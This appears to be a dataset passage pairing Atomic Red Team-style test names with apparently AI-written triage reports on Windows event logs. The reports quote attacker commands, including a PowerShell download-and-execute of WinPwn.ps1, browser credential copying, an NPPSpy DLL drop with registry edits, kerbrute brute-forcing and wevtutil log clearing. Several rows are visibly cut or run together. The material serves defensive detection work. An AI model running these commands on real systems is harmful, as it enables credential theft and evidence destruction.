- **Review and Strengthen Logging:** Ensure adequate logging is in place, and consider additional monitoring of user activities, particularly those with high privileges.
- **Conduct a Security Audit:** Perform a full security audit of the network and systems to identify other potential compromises or vulnerabilities.
- **Malicious Activity Containment:** Implement or refine controls to prevent privilege abuse and unauthorized access to sensitive data.

Engage with your cybersecurity team to address these points and consider legal implications if confidential information was accessed and potentially exfiltrated."
WinPwn - Loot local Credentials - Wifi Credentials,"Upon reviewing the provided logs, the following observations have been made:

### Suspicious Activities:

1. **Event Log Clearing:**
   - Several `wevtutil.exe cl` commands are observed, which are used to clear logs for various channels (Security, System, Application, Windows PowerShell). This action is notably carried out under the username `admin_test` with high integrity, indicating potential intentional log clearance to cover malicious activities.
   - Event ID 1102 in the security logs confirms the clearing of the security logs by `admin_test`.

2. **PowerShell Activity:**
   - The use of a PowerShell script `WinPwn.ps1` from the GitHub repository `S3cur3Th1sSh1t` is suspicious. The script appears to download and execute directly from a remote source. This behavior aligns with potential malicious activity, such as credential dumping (indicated by `wificreds -consoleoutput -noninteractive`).

3. **Time Change Events:**
   - The presence of time change events might signal attempts to manipulate local time for log evasion or other nefarious purposes, seen in Event IDs 4616 and Kernel-General events indicating changes driven by the svchost.exe process.

### Assessment:
The activities within the logs strongly indicate malicious intent:
- **Log Clearing**: Consistently clearing logs across different event channels is a common tactic to hinder forensic analysis.
- **Remote Script Execution via PowerShell**: The PowerShell execution of scripts from an unfamiliar remote repository is highly indicative of malicious use, possibly involving credential theft.

Trigger an authenticated RPC call to a target server with no Sign flag set,"Upon reviewing the logs provided for investigation, several points of interest and potential red flags for security concerns can be identified:

### Anomalous Behavior and Indicators:

1. **PowerShell Execution:**
   - The PowerShell logs indicate the use of `powershell.exe` with a command `{rpcping -s 127.0.0.1 -e 9997 /a connect /u NTLM 1>$Null}`. This command is sophisticated and could potentially be used for network communication or testing RPC connections. Using `rpcping` with local loops might indicate an attempt to obscure network activity or test unauthorized network services.
   - The command also makes use of NTLM, which could suggest credential negotiation or testing that might not be legitimate, especially on a CEO's machine.

2. **Event Log Clearance:**
   - The System, Security, and Windows PowerShell event logs have been cleared (`EventID 104` for System logs and `EventID 1102` for Security logs). This is often a method used by attackers to cover their tracks after executing unauthorized activities.

3. **Use of `wevtutil`:**
   - There are multiple records in the Sysmon log indicating the execution of `wevtutil.exe`, which was used to clear event logs. The use of `wevtutil` to clear logs is suspicious, especially following the PowerShell execution.

4. **Unexpected Process Executions:**
   - There is a series of Sysmon events capturing processes running under `nt authority\system`, which include common Windows processes. However, the processes like `RpcPing.exe` being called indirectly by PowerShell is not usual behavior for regular operations and should be investigated further.

5. **High-Integrity Level Operations:**
   - Several Sysmon logs show execution at a High or System integrity level, which indicates operations that require elevated privileges, potentially indicating privilege escalation attempts or use.

### Assessment of Malicious Activity:

- The combination of PowerShell commands and clearing of event logs points toward a potentially malicious intent, especially since the user `admin_test` has cleared logs around the same timeframe as the suspicious PowerShell execution.
- The use of `rpcping` and the obscuring of its command outputs (redirecting to null) further escalates suspicion as this could be used to test RPC vulnerability or lateral movement tactics.
- The execution of processes with High integrity levels immediately around these events raises further suspicion of a compromise or an attempt to leverage administrative privileges illegitimately.

### Conclusion:

Based on the logs reviewed, the activities documented indicate potential malicious activity:

- **Resolution: MALICIOUS** - There is significant evidence through event log clearing, unusual PowerShell usage, and process execution that these activities were intended to compromise the system potentially or prepare it for further unauthorized access or data exfiltration.

### Guidance on How to Proceed:

1. **Immediate Investigation:**
   - Conduct a forensic investigation on the CEO's machine to gather more evidence of unauthorized activities. Capture memory and disk images for further analysis.
   - Determine if any critical data or credentials were accessed or exfiltrated during these operations.

2. **Strengthen Security Measures:**
   - Review and adjust PowerShell script execution policies. Implement Just Enough Administration (JEA) where necessary.
   - Enhance monitoring and alerting capabilities on EDR for PowerShell executions and log clearing events.
   - Implement group policies to restrict the use of known administrative utilities like `wevtutil` and `rpcping`.

3. **User Awareness and Training:**
   - Conduct security awareness training targeting the high-level executives to make them aware of potential threats and social engineering tactics common to targeted attacks on privileged systems.

4. **Remediation and Containment:**
   - Identify and address any vulnerabilities exploited during this event, starting with patching and updating systems.
   - Isolate potentially compromised systems from the network to prevent further spread.
  
Taking these steps will not only address the immediate threat but also establish a stronger security posture to prevent similar incidents in the future."
Request A Single Ticket via PowerShell,"### Analysis of the Logs

#### Overview
The logs provided for analysis include entries from the Security, Application, Sysmon, Windows PowerShell, and System logs. The logs prominently feature activities associated with the ""admin_test"" account on ""SERVER002,"" engaged in clearing logs and executing PowerShell commands. 

#### Suspicious/Anomalous Behavior
1. **Clearing Event Logs (Security Log Event ID 1102 & System Log Event ID 104):**
   - The clearing of event logs is a significant red flag because it can indicate a user trying to cover tracks of malicious activity. This is especially suspicious given that it was initiated by the ""admin_test"" user.

2. **Command-Line PowerShell Execution (Sysmon Event ID 1 with PowerShell):**
   - Several instances of PowerShell execution are logged, which show scripts being executed that might relate to identity or security token manipulation:
     - The PowerShell command `Add-Type -AssemblyName System.IdentityModel, New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ""HTTP/$ComputerFQDN""` is possibly trying to manipulate token security services, an action typically suspicious if not properly justified.

3. **Log File Alterations:**
   - Multiple calls to `wevtutil` for cleaning various logs (System, Security, and PowerShell) were executed by ""admin_test."" This behavior distinctly corresponds to log tampering to remove traces of activities and is considered decidedly suspicious.

4. **Process Execution by Admin User:**
   - Processes such as `powershell.exe` and `wevtutil.exe` were executed with high integrity level, indicating admin-level privileges, which could imply attempts for privilege misuse.

5. **Edge Updates:**
   - Numerous Edge updates were logged, involving controlled processes by the ""NT AUTHORITY\SYSTEM,"" which seems routine and part of maintenance, thus likely not part of suspicious behavior.

#### Indicators of Malicious Activity
- The combination of event log clearing, targeted PowerShell scripting, and execution of potentially sensitive commands is aligned with patterns seen in post-compromise stages of many attacks. The observed behavior suggests activities consistent with clearing tracks and potential lateral movement reconnaissance.

#### Threat Assessment
- This behavior demonstrates potential insider threat action or a compromised account conducting malicious activities, given the level of access.
- There is a marked risk that sensitive system configuration could be altered, or sensitive data might be accessed or exfiltrated without record due to the cleared logs.

### Resolution
- **MALICIOUS**: The coordinated log clearances, misuse of PowerShell for likely sensitive operations, and use of elevated permissions strongly indicate activities which should be classified as malicious with intent to conceal further operations.

### Guidance on How to Proceed
1. **Immediate Actions:**
   - Isolate the affected machine from the network to prevent further malicious actions.
   - Audit all accounts associated with admin rights, especially ""admin_test,"" for unauthorized accesses or anomalies.

2. **Investigation:**
   - Perform a comprehensive forensic analysis on ""SERVER002"" to identify any additional compromise indicators.
   - Collect and capture volatile data before the logs are wiped again.

3. **Mitigation:**
   - Change all user and system passwords immediately.
   - Reinforce monitoring and alerting mechanisms to detect similar behaviors in real-time.

4. **Follow-up Actions:**
   - Conduct a full impact assessment to understand what data, if any, was accessed or altered.
   - Initiate a review of security policies, especially those regarding account management and log handling.
   - Provide security awareness training to minimize risks of similar compromise in the future."
"WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials","**Analysis of the Logs**

Upon investigation of the provided logs, several points of interest and anomalies stand out that might indicate malicious activity:

1. **Clearing of Event Logs:**
   - The logs indicate multiple instances of event logs being cleared. The `Sysmon`, `Windows PowerShell`, and `Security` event logs were cleared as evidenced by the following entries:
     - **System Log**: Event IDs 104 indicating that logs for 'System' and 'Windows PowerShell' were cleared by `admin_test`.
     - **Security Log**: Event ID 1102 indicating that the `Security` log was cleared by `admin_test`.

   Clearing event logs is a common technique used by attackers to cover their tracks.

2. **Suspicious PowerShell Activity:**
   - In both the `Sysmon` and `Windows PowerShell` logs, there is evidence of a PowerShell command execution with a downloaded script from a GitHub repository. The command involves using `iex(new-object net.webclient).downloadstring(...)` to execute the content of `WinPwn.ps1` from the `S3cur3Th1sSh1t` GitHub repository.
   - This execution method is highly suspicious, as it indicates the possibility of the PowerShell script executing potentially harmful code without user awareness or intervention.

3. **Execution of System Utilities:**
   - There are multiple instances of `wevtutil.exe` (used for clearing event logs and other utilities) being executed with commands that touch various log channels. The command lines show that logs from `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `""Windows PowerShell""` are being cleared.
   - This reinforces the suspicion that log clearing is a deliberate effort possibly related to concealment of activities.

4. **Integrity Level and Privileged Accounts:**
   - The event logs that were cleared and some entries of suspicious PowerShell script execution were done under a high integrity level by the account `SERVER002\admin_test`, indicating administrative privileges and host access.

5. **Time Discrepancies and System Time Changes:**
   - Events related to system time changes hint at potential manipulation of time settings, although it’s often legit for synchronization, in combination with other activities, it can also signal potential tampering.

**Assessment:**

Considering the signs of event log clearing, suspicious PowerShell activities involving external script downloads, and the execution of utility commands that could lead to suppression of possible alerts, the collection of activities within these logs strongly indicates a pattern consistent with malicious behavior.

**Resolution:**

   - Ensure that the system and all applications, including PowerShell, are up-to-date with the latest patches and security fixes.

5. **User and Admin Training:**
   - Educate users, particularly those with elevated privileges, on recognizing phishing attempts or suspicious commands that could lead to unauthorized PowerShell execution. 

Taking immediate steps as outlined above will be crucial in responding to, recovering from, and preventing future incidents of this nature."
Hook PowerShell TLS Encrypt-Decrypt Messages,"To analyze the provided Windows event logs and determine whether they indicate benign, suspicious, or malicious activity, we can break down the logs and investigate the behaviors presented:

### Observations:

1. **Log Clearing Activity**:
   - The system logs indicate that event logs for both the ""System"" and ""Windows PowerShell"" channels were cleared by the user `admin_test` on `SERVER002`. This is captured in both the Sysmon log and the System log.
   - Event ID 1102 in the Security log denotes that the Security logs have also been cleared by the same user.
   - Clearing event logs is a commonly used technique to cover up malicious activities, which is suspicious behavior.

2. **Time Manipulation**:
   - There are events indicating potential time changes, with discrepancies in `NewTime` and `OldTime` fields in the Security log. This can be another obfuscation strategy.

3. **Suspicious PowerShell Usage**:
   - PowerShell is invoked with an obfuscated command that includes suspicious arguments such as `mavinject` and `Invoke-WebRequest` to interact with an external URL (https://www.example.com). This behavior is typical of malicious scripts trying to download or execute payloads from the internet.

4. **Usage of Built-in Windows Tools**:
   - Processes like `wevtutil.exe`, `conhost.exe`, are frequently spawning from user `admin_test`. While these tools are legitimate Windows utilities, frequent and consecutive invocation, especially with high privilege, suggests the possibility of exploitation or misuse.

5. **Privilege Escalation/High Integrity Level**:
   - Multiple processes are running with High integrity level under the user `admin_test`, who has a set of elevated privileges (SeSecurityPrivilege, SeBackupPrivilege, etc.). While not inherently malicious, it is indicative of a potentially compromised admin account or intentional misuse for unauthorized tasks.

6. **Network and Background Services**:
   - Network activity was observed concerning NT AUTHORITY accounts interacting with services like `svchost.exe`, `sppsvc.exe`, and `WmiPrvSE.exe`. These might be legitimate system actions, but in context to other activities, they may suggest lateral movement or persistence techniques.

### Assessment:

Given the combination of event log clearing, suspicious PowerShell execution, potential time tampering, and high-privilege operations under a single user account (`admin_test`), there is significant evidence suggesting malicious behavior.

### Concluding Resolution:
- **MALICIOUS**: The observed activities, particularly the log clearing, suspicious PowerShell usage with external URL access, and the obfuscation techniques, clearly indicate malicious intent.

### Guidance:

1. **Immediate Actions**:
   - Temporarily isolate `SERVER002` from the network to prevent further potential data exfiltration and lateral movement.
   - Revoke or reset the credentials for `admin_test` to prevent further unauthorized access.

2. **Further Investigation**:
   - Perform a detailed forensic analysis on `SERVER002` to identify any additional compromises, suspicious files, or persistence mechanisms.
   - Analyze network traffic for suspicious outbound connections corresponding with the timeframe of the detected PowerShell command execution.
  
3. **Mitigation and Prevention**:
   - Review and enhance security policies including PowerShell logging, restricting high-privilege script executions and maintaining regular security audits.
   - Implement stronger user account management and monitoring practices to detect and prevent unauthorized privileged access attempts in the future.

By addressing these areas, the risk of recurrence can be significantly minimized."
Azure - Search Azure AD User Attributes for Passwords,"Upon reviewing the provided logs, several indicators suggest potential malicious activity. Here's a detailed analysis:

### Suspicious or Anomalous Behavior:
1. **Event Logs Clearing:**
   - The Windows Security event log shows EventID 1102, which indicates that the security logs have been cleared. This action was performed by a user named `admin_test`. Clearing logs is highly suspicious as it can be an attempt to cover up malicious activities.
   - Similarly, the System logs reflect that the logs on the `System` and `Windows PowerShell` channels were cleared (EventID 104).

2. **Use of PowerShell:**
   - Multiple PowerShell EventID 600 events show PowerShell scripts running, which include:
     - Importing sensitive modules (`msonline`).
     - Attempting to collect and store user information, specifically targeting properties containing ""password"".
     - This action aligns with credential access tactics, suggesting an attempt to exfiltrate sensitive information.

3. **Process Monitoring with Sysmon:**
   - Sysmon logs indicate several executions of `wevtutil.exe` with the `cl` (clear logs) command across different channels - `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security`. 
   - The usage of `wevtutil.exe` for clearing logs corroborates the suspicious clearing of event logs seen in the Security and System logs.
   - High integrity level processes are executed which indicates the processes are running with elevated privileges, which in conjunction with the other activities, could be part of privilege escalation tactics.

4. **Credential Harvesting Attempt:**
   - The PowerShell scripts attempt secure string manipulations and credential object creations, which are involved in connecting to services and potentially harvesting user credentials (`Connect-MsolService -Credential $Credential`).

### Assessment of Malicious Activity:
- The combination of event log clearing, PowerShell script execution targeting sensitive user information, and the use of elevated privileges strongly indicates malicious activity. The particular focus on collecting credential-related properties suggests a targeted attempt at compromise.

### Recommendations:
- **Investigate 'admin_test' User Activities:** Review actions performed by this user across other systems to determine if there are similar patterns of behavior.
- **Examine Network Activity:** Look for any outbound connections associated with these actions, especially related to `Connect-MsolService`.
- **Implement Logging Controls:** Enable security monitoring to detect and alert whenever logs are cleared without legitimate cause.
- **Conduct a Full Forensic Analysis:** Determine the extent of the compromise and identify any potential data leakages.
- **Improve PowerShell Logging and Constrain Execution Policies:** Enhance script block logging for PowerShell and enforce execution policies to block unsigned scripts.

Given the evidence of significant suspicious behavior aligned with potential data exfiltration and credential theft tactics, I assess the situation as:

**MALICIOUS** 

Immediate action is recommended to contain and investigate the potential breach further."
Run DSInternals Get-ADReplAccount,"Based on the detailed analysis of the provided Windows event logs, the following observations highlight suspicious or potentially malicious activity:

1. **PowerShell Initiation**:
   - Multiple PowerShell sessions were initiated with the specific command `{Get-ADReplAccount -All -Server $ENV:logonserver.TrimStart(""\\"")}`. This action attempts to retrieve Active Directory replication accounts, which is not a typical user-level activity and could be related to reconnaissance or account enumeration, often seen in lateral movement or privilege escalation attempts.

2. **Event Log Clearing**:
   - The `wevtutil.exe` command was used in succession to clear multiple Windows event logs (Sysmon, Application, Security, and Windows PowerShell logs). This is corroborated by both Security log Event ID 1102 and System log Event ID 104, which indicate log file clearing actions. The clearing of logs is a common tactic used by attackers to cover their tracks.

3. **Process Execution**:
   - The logs show the execution of `wevtutil.exe` and the subsequent involvement of `conhost.exe`. The use of `wevtutil.exe` to clear event logs multiple times within a very short time frame is atypical and points to an effort to suppress evidence of some activity, likely unauthorized.

4. **High Integrity Level**:
   - Most of the executing processes, such as `PowerShell` and `wevtutil`, operated at a high integrity level under the user `SERVER002\admin_test`. This indicates the operations were performed with elevated privileges, which is often required for system modifications and event log clearance.

5. **Series of Related Log Entries**:
   - The sequential use of system utilities, high-level administrative function calls, and log clearing actions occurring in a concise timeframe suggest a coordinated effort rather than sporadic legitimate administrative tasks.

Based on the evidence of suspicious PowerShell activity, log-clearing actions, and the timing and sequence of events, the resolution for this activity is classified as **MALICIOUS**. 

**Guidance**:
- Immediately isolate the affected host from the network to prevent further damage.
- Perform a comprehensive forensic analysis to identify the extent of the breach.
- Review and reset credentials for any accounts accessed through the affected system.
- Assess and ensure necessary security patches are applied to prevent exploitation.
- Improve monitoring and implement alerts for similar activities to prevent future occurrences.
- Conduct a company-wide review and update of privilege management policies to limit the risk of administrative account misuse."
Simulating access to Opera Login Data,"Based on the provided Windows event logs, here’s a detailed analysis of the potentially suspicious activities:

1. **Windows PowerShell Log**: 
    - A sequence of PowerShell commands were executed from the command line. The key observation here is the use of `Copy-Item` to copy login data from the Opera browser, specifically from `""$env:APPDATA\\Opera Software\\Opera Stable\\Login Data""`, to a temporary directory under `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads`.
    - The use of PowerShell to interact directly with user application data, such as browser login data, is often a sign of credential theft or reconnaissance activities, which is suspicious behavior.

2. **Security Log**:
    - The event with ID `1102` indicates that the security log was cleared by the user `admin_test`. Clearing event logs is often an attempt to cover tracks after a compromise or malicious action has been performed and is indicative of potential malicious activity.

3. **System Log**:
    - Similar to the security log, the system log was also cleared, as noted by Event ID `104` by the same user `admin_test`. This reinforces the attempt to hide traces of actions taken on the system.

4. **Sysmon Log**:
    - Multiple entries demonstrate the use of `wevtutil.exe` to clear logs (`wevtutil cl`) which aligns with the log clearing observed in the security and system logs.
    - The same user `admin_test` executed these actions. The execution of `wevtutil.exe` to clear logs is suspicious in conjunction with the log clear events we see in the Security and System logs.
    - The process execution of `powershell.exe` with the copying of sensitive data and `wevtutil.exe` with the intent to clear logs are strong indicators of suspicious behavior.
    
5. **User Account and Environment**:
    - The actions are performed by the `admin_test` user on the `SERVER002` host. The account `admin_test` having administrative privileges could be a point of exploitation, especially if it is a high-privileged account or not regularly monitored.

### Assessment:

- **Suspicious Behavior**: The combination of using PowerShell to access browser login data and the clearing of event logs is highly indicative of malicious activity or an ongoing compromise. The attempt to hide the action by clearing logs further suggests that these actions were not benign.

### Guidance:

- **Immediate Investigation**: Conduct a deeper investigation into the activities of the `admin_test` user and validate whether these actions were authorized.  
- **Preserve Evidence**: Secure any remaining logs and system snapshots for further forensics analysis as evidence may have already been tampered with.
- **User Account Review**: Review the user accounts involved, focusing on who has access to them and whether that access has been misused.
- **Incident Response**: Engage your incident response team to take appropriate actions, which may include isolating the system, resetting credentials, and conducting a broader network sweep for similar activities.

### Resolution:

Given the clear indication of credential access and attempts to cover tracks, my conclusion is: **MALICIOUS**."
Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list),"Based on the provided logs, let us analyze the activities which stand out:

1. **Event Log Clearing (Security ID 1102, System ID 104)**:
   - The Security and System logs indicate that event logs have been cleared, specifically by the user ""admin_test"". This is often a significant red flag because attackers usually clear logs to erase traces of their activities.

2. **Suspicious PowerShell Execution**:
   - The PowerShell logs exhibit unusual commands: `C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*`.
   - The use of `appcmd.exe` to list application pools can indicate reconnaissance activities often seen in post-exploitation phases.

3. **Sysmon logs (Event IDs 1 and 5)**:
   - Multiple instances of `wevtutil.exe` are executed with the `cl` (clear log) option, targeting various log channels such as ""Security"", ""System"", and ""Windows PowerShell"". This action aligns with the event clearing seen in the Security and System logs.

4. **Credential Dumping Attempts (Security Event ID 5379)**:
   - Multiple attempts to read credentials are noted, but all result in access denied (ReturnCode: 3221226021).
   - Frequent attempts to access `Credential Vault` without success might indicate automated or manual attempts to retrieve credential information, potentially by an attacker.

5. **Use of Common Utilities**:
   - Execution of `hostname.exe` and `whoami.exe` suggests attempts to gather system and user context information.

**Assessment**:
- The combination of cleared event logs, suspicious use of PowerShell, attempts to access credential vaults, and possible reconnaissance indicates a high likelihood of compromise.
- Clearing event logs (via `wevtutil.exe`) to hide traces, along with the use of PowerShell for reconnaissance, are common tactics employed by attackers.

**Resolution**: MALICIOUS

**Guidance**:
1. Immediately isolate the affected machine (Server002) from the network to prevent further damage or lateral movement.
2. Conduct a thorough forensic analysis of the machine to determine the extent of compromise.
3. Review and potentially revoke credentials associated with ""admin_test"" and any other affected accounts.

GPP Passwords (Get-GPPPassword),"## Detailed Analysis:

### Suspicious or Anomalous Behavior:

1. **Process Execution and Command Lines:**
   - The execution of `powershell.exe` with the command line script `""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\Get-GPPPassword.ps1""` indicates the attempt to retrieve Group Policy Preferences passwords, which is often associated with security testing or malicious use.
   - The script appears to be executed from within a directory related to Atomic Red Team, which is a known platform for adversary simulation and Red Team exercises. While this could indicate a sanctioned security test, it poses significant risks if unauthorized.
   
2. **Event Log Clearance:**
   - Multiple event logs have been cleared, as evident from the entries with EventID 104 in the System log and EventID 1102 in the Security log, both linked to the account `admin_test`. This can often be indicative of malicious actors trying to hide their tracks after conducting activities that might trigger system or security alerts.

3. **Use of `wevtutil.exe`:**
   - The repeated execution of `wevtutil.exe` with the `cl` parameter to clear event logs (System, Application, Security) under `admin_test` is particularly concerning. This utility is known for managing event logs and can be used to obscure malicious activities by erasing system tracks.

4. **High Integrity Level Processes:**
   - Multiple processes are running at a high integrity level, including the use of `whoami.exe`, which might be used to enumerate the current user context, and `wevtutil.exe` with administrative capabilities.

5. **Unusual User Context:**
   - The activity and usage of system utilities by the user `SERVER002\admin_test`, including processes like `powershell.exe`, `wevtutil.exe`, and `whoami.exe`, raises red flags due to their privileged operations within a short time frame.

### Malicious Activity or Compromise:

- The activities performed by `SERVER002\admin_test` suggest a potential compromise or at least unauthorized activities:
  - Clearing event logs and using PowerShell scripts to potentially retrieve sensitive information.
  - Actions consistent with attempts to cover tracks after performing potentially unauthorized information gathering.
  
- The involvement of known security testing toolkits (Atomic Red Team) and techniques combined with log clearing maneuvers suggests malicious intent unless verified as part of an authorized security assessment.

## Assessment of the Situation:

The combination of PowerShell execution of potentially sensitive scripts, event log clearing using `wevtutil.exe`, and usage of high-integrity level processes to potentially obfuscate user activities strongly suggests unauthorized access, or at a minimum, indicates behavior that must be further investigated.

## Threats/Risks Identified:

- **Potential Data Exfiltration:** The `Get-GPPPassword.ps1` script may extract passwords, posing a risk to secure communications and data integrity.
- **System Integrity Risk:** Clearing logs and executing administrative actions pose a risk to the system's integrity and incident response procedures.

Export Root Certificate with Export-PFXCertificate,"The analysis of the provided logs indicates potential malicious activity based on the following suspicious behaviors:

1. **Clearing of Event Logs**: Multiple instances of log file clearing are observed across the System, Security, and Windows PowerShell channels using the `wevtutil.exe` utility. Clearing event logs is a known tactic used by attackers to hide their tracks after performing unauthorized activities. The logs show that the user ""admin_test"" executed the command to clear these logs, which indicates possible unauthorized or malicious intent.

2. **Suspicious PowerShell Activity**: A PowerShell command was executed by ""admin_test"" to create a self-signed certificate using `New-SelfSignedCertificate` and then export it using `Export-PfxCertificate`. This action is notable as it can be part of credentials or certificate theft tactics. The specific focus on converting a password to a secure string and saving it is highly indicative of potentially nefarious actions.

3. **Repeated Use of `svchost.exe` for Process Execution**: Processes such as `svchost.exe`, which are frequently used in legitimate system operations, show involvement in time zone and time update operations immediately following log clearing. `svchost.exe` may be leveraged by attackers because it usually operates with high privileges.

4. **Microsoft Edge Update Activity**: While many entries indicate legitimate updates related to Microsoft Edge, there is a heavy amount of process creation and potential alterations tied to these updates. Though on its own this isn't strictly suspicious, coupled with log clearing activities, it merits closer scrutiny.

In summary, the logs outline a series of suspect actions centering on event log clearing and the generation/exportation of certificates through PowerShell, both actions being linked to the same user account. Given these findings, I would classify the events as **MALICIOUS**. The coordinated use of standard Windows utilities to obscure activity makes it clear that these actions are not benign or simply suspicious.

**Guidance on how to proceed**:
- Suspend the account ""admin_test"" and any machine associated with this account to terminate potential unauthorized access.
- Conduct a comprehensive assessment of all systems the account might have accessed.
- Enhance logging and monitoring around the use of PowerShell and event log management utilities like `wevtutil.exe`.
- Review and update security awareness training for users regarding the handling of administrative privileges and PowerShell usage.
- Ensure that regular monitoring is in place to detect abnormal behaviors earlier in the future."

BrowserStealer (Chrome - Firefox - Microsoft Edge),"Based on the provided Windows event logs, there are several indicators of suspicious and potentially malicious activity that merit further investigation:

1. **PowerShell Usage and Command-Line Details:**
   - There is an event log related to the execution of `powershell.exe` with a command line that involves accessing and manipulating Firefox browser profile data, particularly files like `key4.db` and `logins.json`. These files store sensitive information such as saved logins and passwords.
   - The command involves removing original files and replacing them with files from a specified temporary directory. The activity seems to simulate credential dumping from the browser, which is a well-known technique often associated with malware or penetration testing tools like those used by Red Teams (e.g., Atomic Red Team). This is a strong indicator of potentially malicious behavior.

2. **Clearing of Event Logs:**
   - Logs indicate the clearing of event logs (`Security`, `System`, `Windows PowerShell`). This behavior is typically associated with threat actors attempting to remove traces of their activity from a system, thereby complicating forensic analysis and incident response.

3. **Elevation of Privileges:**
   - Execution of processes like `wevtutil.exe` to clear event logs happened with high integrity levels, suggesting potential privilege escalation or usage of administrative privileges to cover tracks.

4. **Repeated and Automated Actions:**
   - The sequence of events occurs in a rapid and automated manner, suggesting the use of scripts or toolkits designed to execute a pre-defined set of malicious actions.

5. **Execution of Suspicious Binaries:**
   - Several processes such as `wevtutil.exe`, `conhost.exe`, and Windows PowerShell with unusual command lines and sequences indicate activities that are not typically observed in normal user behavior. These processes are creating, executing, and closing with command lines that suggest automation for malicious purposes.

These observations strongly suggest that the set of activities observed in the logs likely represents a compromise. Specifically, there appears to be an attempt to perform credential dumping from the Firefox browser followed by actions to clear event logs on the system to hide these activities. The user account `admin_test` is more likely the compromised account used to perform these actions.

### Conclusion: MALICIOUS

The activities outlined in the logs are highly indicative of malicious behavior, possibly involving data exfiltration and subsequent log clearing to obscure the activity. Immediate actions should be taken to:
- Isolate and analyze the affected system further.

Credential Dumping with NPPSpy,"### Detailed Analysis of the Logs:

#### 1. **Security and System Log Analysis:**

- **EventLog ID 1102:** A security log clearing event is logged with Event ID 1102. This indicates that the security log was cleared by the `admin_test` user. Log clearing is generally considered suspicious, particularly when performed by an unexpected user or without a routine maintenance justification.

- **EventLog ID 104:** Entries indicate that the system logs and the Windows PowerShell logs were also cleared by the same user `admin_test`. The log clearing of multiple channels in quick succession strongly suggests an attempt to cover tracks.

#### 2. **Windows PowerShell Log Analysis:**

- Multiple entries with Event ID 600 detail unusual PowerShell activity:
  - Command `Copy-Item ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\NPPSPY.dll"" -Destination ""C:\\Windows\\System32""` shows file movement to a system directory, which is indicative of unauthorized deployment of a DLL potentially for persistence or loading malicious code into a system process.
  - Commands to modify registry entries are indicative of persistent modification (`Set-ItemProperty` to `PROVIDERORDER` with additional `NPPSpy`).
  - The presence of commands creating new services or modifying existing ones in the registry (`New-Item` and `New-ItemProperty`) signals a setup of persistent mechanisms which is a common tactic used by adversaries.
  - The script includes a statement about 'cleartext password' being stored in a text file path indicating likely credential dumping intentions.

#### 3. **Sysmon Log Analysis:**

- **Sysmon Event ID 1 and 5:** Processes such as `wevtutil.exe` are extensively used to clear logs (security, application, system), following the timeline matching the Security and PowerShell log clearing events. This strengthens the suspicion of malicious activity.
- **Sysmon Event 1:** Repeated execution of `powershell.exe` with malicious command-line arguments. The script appears to be part of an attacker framework (potentially Atomic Red Team test/technique names) for simulating adversarial behavior. However, Atomic Red Team techniques are sometimes used for legitimate testing.
- The presence of conhost.exe instances is common but can also be associated with command-line executions where command history and extent can be hidden.

### Assessment of the Situation:

The collection of events analyzed suggests a sequence of actions typical of a malicious operation:
- Clearing of logs in quick succession across multiple channels.
- Execution of potentially harmful PowerShell scripts that alter system and network configurations.
- Installation of DLLs into system directories, which could be used for unauthorized code execution or persistence.
- Notifications of logs suggested password capture, indicative of theft or misuse.

These logs demonstrate clear actions aligned with post-exploitation activities, attempting to modify persistence, elevate privileges, and exfiltrate credentials.

### Resolution:
**MALICIOUS** - The logs clearly indicate malicious activity including unauthorized modifications to system configurations, attempts to erase forensic footprints by clearing logs, and obvious malicious intentions explained within the scripting activity. Immediate response actions are recommended:

1. **Containment:** Isolate the affected machine (Server002) from the network to prevent further actions by the malicious actor.
2. **Eradication:** Remove any unauthorized files and registry entries, especially those related to `NPPSpy.dll`.
3. **Recovery:** Restore system configurations to a known good state.
4. **Review Security Policies:** Strengthen monitoring and alerting on such activities, ensure log retainment, and validate users/permissions who can clear logs.
5. **User Training and Awareness:** Communicate and enforce secure practices, particularly focusing on privileged accounts like that of the user `admin_test`.
6. **Incident Reporting:** Report the activity to relevant stakeholders and, if required, to authorities."
Brute Force:Credential Stuffing using Kerbrute Tool,"Upon analyzing the provided logs, several points of concern suggest potentially malicious activities:

1. **Event Log Clearing:** 
   - The system logs and security logs were cleared by a user with the username `admin_test`. This is indicated by the following events:
     - System Event ID **104**: Logs cleared in the System log by `admin_test`.
     - Security Event ID **1102**: Logs cleared in the Security log by `admin_test`.
   - Clearing event logs is often associated with attempts to cover tracks, generally a red flag in security monitoring.

2. **Suspicious PowerShell Command:**
   - The Sysmon log indicates the execution of a `PowerShell` command with potential malicious intent:
     - Log entry in both Sysmon and Windows PowerShell logs indicate `powershell.exe` executing a command involving `kerbrute.exe`, typically used for Kerberos brute-force attacks.
     - The command was executed by `admin_test`, as found in:
       - Sysmon Event ID **1** and Windows PowerShell logs, showing `kerbrute.exe` running with a brute-force command.

3. **Linked Sysmon Activity:**
   - Numerous events show the usage of `wevtutil.exe` by `admin_test`, likely associated with clearing logs, given the proximity in time to the log clearance events.
   - The environment and behavior around these executions (e.g., use of `Eventing Command Line Utility`) align with log manipulation.

4. **Executable Analysis:**
   - The presence of `kerbrute.exe` in the PowerShell command and the specific PowerShell execution context suggest unauthorized penetration testing tools or hacking utilities are being employed internally.

**Assessment:**
- The activity in the logs suggests use of tools and behavior patterns commonly associated with malicious behavior or penetration testing tools by internal users. This activity includes:
  - Log Clearing
  - Execution of potentially malicious scripts aimed at exploiting or brute-forcing authentication systems.

These behaviors generally align with the latter stages of an attack lifecycle, such as privilege escalation and data manipulation. There is a strong indication that the activities logged are unauthorized and align more with a security breach or security audit test simulation without proper control documentation.

**Resolution: MALICIOUS**
- It is recommended to:
  - Immediately isolate and investigate the CEO's machine and the user `admin_test`.
  - Perform a thorough review of access and audit logs to determine the full scope of actions undertaken by `admin_test`.
  - Engage in communication with the CEO and relevant staff to ascertain whether these activities were sanctioned as part of an internal audit or unauthorized.
  - Reinforce log monitoring and implement alerts for similar activities in the future."
LSASS read with pypykatz,"**Detailed Analysis of the Logs:**

1. **Event Log Clearing:**
